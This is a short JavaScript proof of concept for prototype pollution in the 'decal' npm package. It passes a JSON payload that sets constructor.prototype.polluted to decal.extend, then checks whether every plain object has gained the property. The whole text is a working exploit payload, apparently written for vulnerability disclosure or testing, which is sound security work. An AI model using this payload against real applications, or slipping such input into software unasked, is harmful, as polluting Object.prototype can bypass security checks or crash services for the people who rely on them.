const decal = require('decal');
console.log({}.polluted);
const o = JSON.parse('{"constructor": {"prototype": {"polluted":"yes"}}}');
decal.extend({}, true, o);
console.log({}.polluted);